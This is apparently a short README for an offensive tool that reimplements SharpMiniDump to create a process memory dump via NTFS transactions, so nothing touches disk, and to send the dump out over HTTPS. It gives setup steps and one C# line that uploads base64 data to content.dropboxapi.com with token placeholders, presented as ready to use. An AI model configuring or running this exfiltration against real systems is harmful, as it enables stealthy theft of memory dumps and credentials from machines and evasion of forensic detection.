# SharpMiniDump

Implementation of b4rtiks's [SharpMiniDump](https://github.com/b4rtik/SharpMiniDump) using NTFS transactions to avoid writting the minidump to disk and exfiltrating it via HTTPS using sockets. As a POC, dropbox is used to exfiltrate the data but this can me easily modified.

If you wish to use dropbox, just change the following parameters at Program.cs:201 and you are good to go.

```C#
SslTcpClient.RunClient("content.dropboxapi.com", "<FOLDER>", "<DROPBOX TOKEN>", b64);
```


 
